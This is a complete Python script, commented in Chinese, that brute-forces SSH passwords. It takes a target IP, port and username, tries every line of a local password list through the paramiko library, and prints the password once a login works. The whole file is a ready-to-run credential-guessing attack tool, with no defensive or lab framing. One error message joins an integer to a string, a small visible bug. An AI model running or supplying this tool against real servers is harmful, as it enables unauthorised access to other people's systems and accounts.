import paramiko
from sys import argv

if len(argv) >= 4:
    server_ip = argv[1]
    port = argv[2]
    username = argv[3]
else:
    print('參數錯誤，正確參數為：python3 BruteForceAttack.py IPaddress Port username')
    quit()

def ssh_loggin(password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(server_ip,port,username,password,timeout=10)

#Brute Force Attack
#使用字典攻擊(Dictionary attack)對SSH連線進行密碼破解
def Brute_Force_Attack():
    #讀取字典檔，路徑=./password.txt
    password = open('./password.txt')
    time = 0
    #嘗試密碼暴力破解
    for pw in password:
        try:
            pw = pw.replace('\n','')
            time = time+1
            ssh_loggin(pw)
            #破解成功
            print('Loggin Success')
            print('Password:'+pw)
            quit()
        except paramiko.ssh_exception.AuthenticationException:
            continue
        except SystemExit:
            quit()
        except paramiko.ssh_exception.SSHException:
            #目標拒絕連線
            print('拒絕連線，總共嘗試破解'+str(time)+'次')
            quit()
        except:
            if time > 1:
                print('破解失敗，總共嘗試破解'+str(time)+'次')
                quit()
            else:
                print('連線逾時，請確認網路狀態或IP位置是否正確')
                quit()
    if time > 1:
        print('總共嘗試破解'+time+'次，破解失敗，請換其他字典檔。')
    else:
        print('請確認字典檔格式是否正確')

Brute_Force_Attack()